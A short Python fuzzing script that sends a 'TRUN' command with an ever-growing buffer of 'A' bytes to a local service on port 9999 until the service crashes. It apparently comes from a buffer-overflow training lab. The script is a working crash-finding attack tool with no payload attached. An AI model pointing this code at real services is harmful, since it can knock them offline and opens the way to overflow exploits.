import socket
import time
 
buffer = b"A" * 100
 
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("127.0.0.1", 9999))
        s.recv(1024)
        print(f"Sending {len(buffer)} bytes...")
        s.send(b"TRUN /.:/ " + buffer + b"\r\n")
        s.close()
        time.sleep(1)
        buffer += b"A" * 100
    except Exception as e:
        print(f"Fuzzing crashed at approximately {len(buffer)} bytes")
        break
